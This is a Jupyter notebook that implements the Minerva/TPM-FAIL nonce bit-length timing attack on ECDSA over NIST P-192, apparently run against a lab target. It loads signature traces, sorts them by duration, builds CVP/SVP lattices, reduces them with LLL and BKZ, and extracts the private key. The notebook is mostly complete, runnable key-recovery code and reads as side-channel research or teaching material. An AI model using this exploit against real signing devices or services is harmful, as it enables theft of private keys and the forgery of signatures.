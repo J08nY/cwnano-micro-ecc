{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "add212c2",
   "metadata": {},
   "source": [
    "# Nonce bit-length leak attack (Minerva, TPM-FAIL, ...)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "563d9bb5",
   "metadata": {},
   "outputs": [],
   "source": [
    "from fpylll import LLL, BKZ, IntegerMatrix, GSO\n",
    "from pyecsca.sca.trace_set import PickleTraceSet\n",
    "from pyecsca.ec.params import get_params\n",
    "from pyecsca.ec.mod import Mod"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8d1ff9be",
   "metadata": {},
   "outputs": [],
   "source": [
    "curve = get_params(\"nist\", \"P-192\", \"projective\")\n",
    "n = curve.order"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "30618e16",
   "metadata": {},
   "source": [
    "Read the collected traces."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c35ddea",
   "metadata": {},
   "outputs": [],
   "source": [
    "trace_set = PickleTraceSet.read(\"traces.pickle\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c1c6cb3b",
   "metadata": {},
   "source": [
    "Get the signatures out of the traces and sort them by duration (fastest first)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7b9d48bb",
   "metadata": {},
   "outputs": [],
   "source": [
    "signatures = [(trace.meta[\"duration\"], trace.meta[\"signature\"], trace_set.hash) for trace in trace_set]\n",
    "signatures.sort()\n",
    "\n",
    "pubkey = trace_set.pubkey"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "00666456",
   "metadata": {},
   "source": [
    "Compute the $t = s^{-1} r$ and $u = - s^{-1} h$ values from the signatures. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "52c80a64",
   "metadata": {},
   "outputs": [],
   "source": [
    "def compute_tu(r: int, s: int, h: int):\n",
    "    r = Mod(r, n)\n",
    "    s = Mod(s, n)\n",
    "    h = Mod(h, n)\n",
    "    s_inv = s.inverse()\n",
    "    t = s_inv * r\n",
    "    u = - s_inv * h\n",
    "    return int(t), int(u)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ddba694a",
   "metadata": {},
   "source": [
    "Estimate the number of leading zero bits at signature with `index`, assuming sorted `total` of collected signatures."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "46342739",
   "metadata": {},
   "outputs": [],
   "source": [
    "def compute_bound(index: int, total: int):\n",
    "    i = 1\n",
    "    while (total) / (2 ** i) >= index + 1:\n",
    "        i += 1\n",
    "    i -= 1\n",
    "    if i <= 1:\n",
    "        return 0\n",
    "    return i"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4a19ec7",
   "metadata": {},
   "source": [
    "Construct the CVP lattice and target vector.\n",
    "\n",
    "$$\n",
    "B = \\begin{pmatrix}\n",
    "2^{l_1+1}n & 0 & 0 & \\ldots & 0 & 0 \\\\\n",
    "0 & 2^{l_2+1}n & 0 & \\ldots & 0 & 0 \\\\\n",
    "& \\vdots & & & \\vdots & \\\\\n",
    "0 & 0 & 0 & \\ldots & 2^{l_d+1}n & 0 \\\\\n",
    "2^{l_1+1}t_1 & 2^{l_2+1}t_2 & 2^{l_3+1}t_3 & \\ldots & 2^{l_d+1}t_d & 1\n",
    "\\end{pmatrix}\n",
    "$$\n",
    "\n",
    "$$ v = \\begin{pmatrix}2^{l_1+1}u_1 + n & 2^{l_2+1}u_2 + n & \\ldots & 2^{l_d+1}u_d + n & 0\\end{pmatrix} $$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42bfb48a",
   "metadata": {},
   "outputs": [],
   "source": [
    "def construct_cvp(sigs, total):\n",
    "    size = len(sigs)\n",
    "    dim = size + 1\n",
    "    B = IntegerMatrix(dim, dim)\n",
    "    v = [0] * dim\n",
    "    for i, sig in enumerate(sigs):\n",
    "        bound = compute_bound(i, total) + 1\n",
    "        r, s = sig[1]\n",
    "        h = int.from_bytes(sig[2], byteorder=\"big\")\n",
    "        t, u = compute_tu(r, s, h)\n",
    "        \n",
    "        B[i, i] = (2 ** bound) * n\n",
    "        B[size, i] = (2 ** bound) * t\n",
    "        \n",
    "        v[i] = (2 ** bound) * u + n\n",
    "    B[size, size] = 1\n",
    "    return B, v"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "981841cb",
   "metadata": {},
   "source": [
    "Construct the SVP lattice.\n",
    "\n",
    "$$\n",
    "C = \\begin{pmatrix}\n",
    "2^{l_1+1}n & 0 & 0 & \\ldots & 0 & 0 & 0 \\\\\n",
    "0 & 2^{l_2+1}n & 0 & \\ldots & 0 & 0 & 0 \\\\\n",
    "& \\vdots & & & \\vdots & & \\\\\n",
    "0 & 0 & 0 & \\ldots & 2^{l_d+1}n & 0 & 0\\\\\n",
    "2^{l_1+1}t_1 & 2^{l_2+1}t_2 & 2^{l_3+1}t_3 & \\ldots & 2^{l_d+1}t_d & 1 & 0\\\\\n",
    "2^{l_1+1}u_1 + n & 2^{l_2+1}u_2 + n & 2^{l_3+1}u_3 + n & \\ldots & 2^{l_d+1}u_d + n & 0 & n\n",
    "\\end{pmatrix}\n",
    "$$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1066f93e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def construct_svp(sigs, total):\n",
    "    size = len(sigs)\n",
    "    dim = size + 2\n",
    "    C = IntegerMatrix(dim, dim)\n",
    "    sb = 0\n",
    "    for i, sig in enumerate(sigs):\n",
    "        bound = compute_bound(i, total) + 1\n",
    "        r, s = sig[1]\n",
    "        h = int.from_bytes(sig[2], byteorder=\"big\")\n",
    "        t, u = compute_tu(r, s, h)\n",
    "        \n",
    "        C[i, i] = (2 ** bound) * n\n",
    "        C[size, i] = (2 ** bound) * t\n",
    "        \n",
    "        C[size + 1, i] = (2 ** bound) * u + n\n",
    "    C[size, size] = 1\n",
    "    C[size + 1, size + 1] = n\n",
    "    return C"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a38d97ea",
   "metadata": {},
   "source": [
    "Reduce the SVP lattice."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e610a8dc",
   "metadata": {},
   "outputs": [],
   "source": [
    "C = construct_svp(signatures[:150], len(signatures))\n",
    "M = GSO.Mat(C)\n",
    "M.update_gso()\n",
    "L = LLL.Reduction(M)\n",
    "L()\n",
    "\n",
    "C = BKZ.reduction(C, BKZ.Param(30, strategies=BKZ.DEFAULT_STRATEGY, auto_abort=True))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb3e9067",
   "metadata": {},
   "source": [
    "Extract the private key from the second to last column of the reduced SVP lattice basis."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6dfd5297",
   "metadata": {},
   "outputs": [],
   "source": [
    "def extract_privkey(lattice, pubkey):\n",
    "    for row in lattice:\n",
    "        privkey_guess = row[-2] % n\n",
    "        if privkey_guess:\n",
    "            pubkey_guess = curve.curve.affine_multiply(curve.generator.to_affine(), privkey_guess)\n",
    "            if pubkey_guess.x == pubkey[0] and pubkey_guess.y == pubkey[1]:\n",
    "                return privkey_guess\n",
    "        privkey_guess = (n - privkey_guess) % n\n",
    "        if privkey_guess:\n",
    "            pubkey_guess = curve.curve.affine_multiply(curve.generator.to_affine(), privkey_guess)\n",
    "            if pubkey_guess.x == pubkey[0] and pubkey_guess.y == pubkey[1]:\n",
    "                return privkey_guess\n",
    "    return None\n",
    "priv = extract_privkey(C, pubkey)\n",
    "print(priv)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3b12a68c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from utils import xorshift32"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e67df22",
   "metadata": {},
   "outputs": [],
   "source": [
    "x = xorshift32(0xcafebabe)\n",
    "priv = int.from_bytes(x.next_bytes(24), byteorder=\"little\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59e8bb3e",
   "metadata": {},
   "outputs": [],
   "source": [
    "curve.curve.affine_multiply(curve.generator.to_affine(), priv)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "24e0cdd5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
